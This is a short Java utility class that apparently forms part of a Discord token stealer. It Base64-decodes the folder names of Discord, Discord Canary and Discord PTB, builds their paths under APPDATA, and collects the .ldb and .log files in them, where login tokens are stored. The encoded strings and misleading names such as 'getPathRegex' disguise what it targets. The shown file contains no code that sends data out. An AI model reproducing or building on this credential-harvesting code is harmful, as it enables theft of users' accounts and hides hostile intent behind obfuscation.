package xd.utils;

import java.util.Base64;
import java.util.List;
import java.util.ArrayList;
import java.io.File;
import java.nio.file.Paths;

public class b {
    public static final String data = System.getenv("APPDATA");
    private static List<String> path = new ArrayList<>();

    public static List<String> getDefaultPaths() {
        loadDefaultPaths();
        return path;
    }
    private static void loadDefaultPaths() {
        path.add(Paths.get(data, getPathRegex("ZGlzY29yZA==")).toString());
        path.add(Paths.get(data, getPathRegex("ZGlzY29yZGNhbmFyeQ==")).toString());
        path.add(Paths.get(data, getPathRegex("ZGlzY29yZHB0Yg==")).toString());
    }
    public static List<File> validAuths(String path) {
        List<File> valid = new ArrayList<>();

        File directory = new File(path);
        if (!directory.exists()) return valid;

        for (File file : directory.listFiles()) {
            String fileName = file.getName();
            if (fileName.endsWith(".ldb") || fileName.endsWith(".log")) valid.add(file);
        }

        return valid;
    }

    public static String getPathRegex(String helper) {
        byte[] regexPaths = Base64.getDecoder().decode(helper.getBytes());
        return new String(regexPaths);
    }
}
